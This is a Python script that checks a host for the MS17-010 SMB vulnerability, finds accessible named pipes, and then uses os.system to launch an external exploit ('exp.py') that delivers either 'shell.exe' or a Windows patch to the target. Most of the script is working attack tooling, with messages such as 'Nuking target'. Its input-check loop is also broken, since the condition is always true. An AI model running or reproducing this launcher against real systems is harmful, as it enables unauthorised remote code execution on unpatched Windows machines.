from mysmb import MYSMB
from impacket import smb, smbconnection, nt_errors
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.rpcrt import DCERPCException
from struct import pack
import sys
import os

'''
Script for
- check target if MS17-010 is patched or not.
- find accessible named pipe
'''

USERNAME = ''
PASSWORD = ''

NDR64Syntax = ('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0')

MSRPC_UUID_BROWSER = uuidtup_to_bin(('6BFFD098-A112-3610-9833-012892020162', '0.0'))
MSRPC_UUID_SPOOLSS = uuidtup_to_bin(('12345678-1234-ABCD-EF00-0123456789AB', '1.0'))
MSRPC_UUID_NETLOGON = uuidtup_to_bin(('12345678-1234-ABCD-EF00-01234567CFFB', '1.0'))
MSRPC_UUID_LSARPC = uuidtup_to_bin(('12345778-1234-ABCD-EF00-0123456789AB', '0.0'))
MSRPC_UUID_SAMR = uuidtup_to_bin(('12345778-1234-ABCD-EF00-0123456789AC', '1.0'))

pipes = {
    'browser': MSRPC_UUID_BROWSER,
    'spoolss': MSRPC_UUID_SPOOLSS,
    'netlogon': MSRPC_UUID_NETLOGON,
    'lsarpc': MSRPC_UUID_LSARPC,
    'samr': MSRPC_UUID_SAMR,
}


def bomb(pipe):
    print ("[*] Nuking target...     [*]\n")
    # print "[*] Starting services... [*]\n"
    ipaddre = sys.argv[1]  # '192.168.17.134'
    u_choice = raw_input("Shell or Patch? (S/P) for " + ipaddre)

    while (u_choice != 'S' or u_choice != 's' or u_choice != 'P' or u_choice != 'p'):
        u_choice = raw_input("Please enter valid choice (S/P): ")

    global command
    if u_choice == 'S' or u_choice == 's':
        command = 'python exp.py ' + ipaddre + ' ' + pipe + ' shell.exe'
    elif u_choice == 'P' or u_choice == 'p':
        command = 'python exp.py ' + ipaddre + ' ' + pipe + ' win_7.msu'
    # elif u_choice == 'I':
    #     comman = 'python exp.py ' + ipaddre + ' ' + pipe + ' identify.exe'
    print (command)
    os.system(command)


if len(sys.argv) < 2:
    print("Wrong arguments to checker! <ip>".format(sys.argv[0]))
    sys.exit(1)

target = sys.argv[1]
print ("\nNuking " + target)

conn = MYSMB(target)
try:
    conn.login(USERNAME, PASSWORD)
except smb.SessionError as e:
    print('Login failed: ' + nt_errors.ERROR_MESSAGES[e.error_code][0])
    sys.exit()
finally:
    print('Target OS: ' + conn.get_server_os())

tid = conn.tree_connect_andx('\\\\' + target + '\\' + 'IPC$')
conn.set_default_tid(tid)

# Test if target is vulnerable
TRANS_PEEK_NMPIPE = 0x23
recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE), maxParameterCount=0xffff, maxDataCount=0x800)
status = recvPkt.getNTStatus()
if status == 0xC0000205:  # STATUS_INSUFF_SERVER_RESOURCES
    print('The target is open for nuking!')
else:
    print('The target is patched!')
    sys.exit(0)

print('')
print('[*] Testing named pipes..[*]')
listing = ''
for pipe_name, pipe_uuid in pipes.items():
    try:
        dce = conn.get_dce_rpc(pipe_name)
        dce.connect()
        try:
            dce.bind(pipe_uuid, transfer_syntax=NDR64Syntax)
            print('{}: Ok (64 bit)'.format(pipe_name))
            listing = str(pipe_name) + ',' + listing
        # str = format(pipe_name)
        # print str
        # listing = listing + pipe_name
        # print('{}: Ok (64 bit)'.format(pipe_name))
        except DCERPCException as e:
            if 'transfer_syntaxes_not_supported' in str(e):
                print('{}: Ok (32 bit)'.format(pipe_name))
                # listing = listing + pipe_name
            else:
                print('{}: Ok ({})'.format(pipe_name, str(e)))
            listing = str(pipe_name) + ',' + listing

        dce.disconnect()
    except smb.SessionError as e:
        # print('{}: {}'.format(pipe_name, nt_errors.ERROR_MESSAGES[e.error_code][0]))
        print("[*] Connection failed!!  [*]")
    except smbconnection.SessionError as e:
        # print('{}: {}'.format(pipe_name, nt_errors.ERROR_MESSAGES[e.error][0]))
        print("[*] Connection failed!!  [*]")

conn.disconnect_tree(tid)
conn.logoff()
conn.get_socket().close()
print ("\n[*] Attackable namedpipes :P [*]")
s = ","
print (listing.replace(",", "\n"))

listing = listing.replace(",", " ")
for namedpipe in listing.split():
    try:
        # print namedpipe
        bomb(namedpipe)
        break
        # time.sleep(5)
    except:
        print ("")

sys.exit(0)
# os.system("python tcp_server.py")
